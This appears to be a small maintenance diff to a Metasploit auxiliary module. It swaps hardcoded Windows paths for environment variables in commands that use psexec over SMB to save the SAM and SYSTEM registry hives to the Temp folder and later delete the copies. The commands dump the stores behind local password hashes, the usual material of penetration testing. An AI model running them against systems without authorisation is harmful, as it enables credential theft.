@@ -78,7 +78,7 @@ class Metasploit3 < Msf::Auxiliary
 		begin
 			# Try to save the hive files
 			simple.connect(smbshare)
-			command = "C:\\WINDOWS\\SYSTEM32\\cmd.exe /C reg.exe save HKLM\\SAM C:\\WINDOWS\\Temp\\#{sampath} /y && reg.exe save HKLM\\SYSTEM C:\\WINDOWS\\Temp\\#{syspath} /y"
+			command = "%COMSPEC% /C reg.exe save HKLM\\SAM %WINDIR%\\Temp\\#{sampath} /y && reg.exe save HKLM\\SYSTEM %WINDIR%\\Temp\\#{syspath} /y"
 			psexec(smbshare, command)
 			return true
 		rescue StandardError => saveerror
@@ -132,7 +132,7 @@ class Metasploit3 < Msf::Auxiliary
 		begin
 			# Try and do cleanup
 			simple.connect(smbshare)
-			cleanup = "C:\\WINDOWS\\SYSTEM32\\cmd.exe /C del /F /Q C:\\WINDOWS\\Temp\\#{sampath} C:\\WINDOWS\\Temp\\#{syspath}"
+			cleanup = "%COMSPEC% /C del /F /Q %WINDIR%\\Temp\\#{sampath} %WINDIR%\\Temp\\#{syspath}"
 			psexec(smbshare, cleanup)
 		rescue StandardError => cleanerror
 			print_error("#{ip} - Unable to run cleanup, need to manually remove hive copies from windows temp directory: #{cleanerror}")
